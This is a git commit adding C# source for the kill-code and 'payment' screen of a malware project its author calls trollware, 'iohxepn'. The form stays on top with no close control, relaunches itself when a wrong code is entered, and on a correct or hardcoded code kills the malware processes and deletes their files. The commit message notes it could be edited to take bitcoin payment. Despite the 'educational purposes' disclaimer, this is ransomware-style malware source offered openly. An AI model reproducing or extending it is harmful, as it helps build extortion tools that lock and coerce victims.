e07d65a8ffcf6a222887a6140608c021fc2c1da9
anonfoxer <kevinandlife@gmail.com>
2020-03-16 15:24:24 -0500

    Killcode Processor
    This processes any killcodes entered into it to shut down the malware. Theres a few hardcoded ones, and it also attempts to read the killcode generated by the main process.
    
    it is always at the front with no controls to delete it.
    
    This contains the already built binary as it is not, in its self. malicious.
    
    It could be edited to process bitcoin payment.

---
+++ iohxepnPay/iohxepnPay/Form1.Designer.cs
@@ -0,0 +1,121 @@
+﻿namespace iohxepnPay
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.killCodeInput = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.killCodeSubmit = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Empires", 36F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.ForeColor = System.Drawing.SystemColors.ControlLightLight;
+            this.label1.Location = new System.Drawing.Point(12, 9);
+            this.label1.Name = "label1";
+            this.label1.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
+            this.label1.Size = new System.Drawing.Size(126, 56);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "iohxepn";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Empires", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.ForeColor = System.Drawing.SystemColors.ControlLightLight;
+            this.label2.Location = new System.Drawing.Point(12, 65);
+            this.label2.Name = "label2";
+            this.label2.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
+            this.label2.Size = new System.Drawing.Size(99, 28);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "by anonfoxer";
+            // 
+            // killCodeInput
+            // 
+            this.killCodeInput.Location = new System.Drawing.Point(147, 76);
+            this.killCodeInput.Name = "killCodeInput";
+            this.killCodeInput.Size = new System.Drawing.Size(308, 20);
+            this.killCodeInput.TabIndex = 2;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.ForeColor = System.Drawing.SystemColors.ControlLightLight;
+            this.label3.Location = new System.Drawing.Point(144, 60);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(72, 13);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "Enter Killcode";
+            // 
+            // killCodeSubmit
+            // 
+            this.killCodeSubmit.Location = new System.Drawing.Point(461, 76);
+            this.killCodeSubmit.Name = "killCodeSubmit";
+            this.killCodeSubmit.Size = new System.Drawing.Size(75, 21);
+            this.killCodeSubmit.TabIndex = 4;
+            this.killCodeSubmit.Text = "Submit";
+            this.killCodeSubmit.UseVisualStyleBackColor = true;
+            this.killCodeSubmit.Click += new System.EventHandler(this.killCodeSubmit_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.DarkRed;
+            this.ClientSize = new System.Drawing.Size(599, 119);
+            this.ControlBox = false;
+            this.Controls.Add(this.killCodeSubmit);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.killCodeInput);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "iohxepn freedom gateway";
+            this.TopMost = true;
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox killCodeInput;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Button killCodeSubmit;
+    }
+}
+
---
+++ iohxepnPay/iohxepnPay/Form1.cs
@@ -0,0 +1,141 @@
+﻿/* As per usual:
+ * 
+ * iohxepn and all parts of it are for educational purposes only.
+ * dont use this as malware, you can go to prison.
+ * i am not responsible for your use of this software.
+ * 
+ * (C) 2020 anonfoxer */
+
+
+
+
+using System;
+using System.Diagnostics;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Security;
+using System.Security.Cryptography;
+using System.IO;
+using System.Net;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+
+namespace iohxepnPay
+{
+    public partial class Form1 : Form
+    {
+        //same launch vars as the malware dropper
+        //current user of windows
+        string userName = Environment.UserName;
+        //name of the computer
+        string computerName = System.Environment.MachineName.ToString();
+        string userDir = "C:\\Users\\";
+        //it writes killcode to this file in pc
+        string pcPassword = "\\killcode.txt";
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            MessageBox.Show("iohxepn trollware: written by anonfoxer. gateway to disable virus!");
+            MessageBox.Show("Please note the original version ofthe virus has THIS message to let you know that you do not need to pay bitcoin!! You are just to find the killcode and enter it here!");
+        }
+
+        private void cleanup()
+        {
+            #region CLEANUP
+            try
+            {
+                foreach (var proc in Process.GetProcessesByName("iohxepnLoadDist"))
+                {
+                    proc.Kill();
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+            try
+            {
+                foreach (var proc in Process.GetProcessesByName("iohxepn"))
+                {
+                    proc.Kill();
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+            try
+            {
+                foreach (var proc in Process.GetProcessesByName("iohxepnPay"))
+                {
+                    proc.Kill();
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+            try
+            {
+                string path = "\\iohxepn.exe";
+                string fullpath = userDir + userName + path;
+                File.Delete(fullpath);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+            try
+            {
+                string path = "\\iohxepnPay.exe";
+                string fullpath = userDir + userName + path;
+                File.Delete(fullpath);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+            try
+            {
+                string path = "\\iohxepnLoadDist.exe";
+                string fullpath = userDir + userName + path;
+                File.Delete(fullpath);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+            #endregion
+        }
+
+        private void killCodeSubmit_Click(object sender, EventArgs e)
+        {
+            string pcPath = userDir + userName + pcPassword;
+            string code = File.ReadAllText(pcPath);
+
+            if (killCodeInput.Text == code || killCodeInput.Text == "butts" || killCodeInput.Text == "vore!" || killCodeInput.Text == "e621.net")
+            {
+                cleanup();
+                MessageBox.Show("Correct code entered! Your PC will now be cleaned of iohxepn! Hope you enjoyed the fun! <3");
+                System.Windows.Forms.Application.Exit();
+            }
+            else
+            {
+                MessageBox.Show("Incorrect code! Try again!");
+                System.Diagnostics.Process.Start("iohxepnPay.exe");
+            }
+        }
+    }
+}
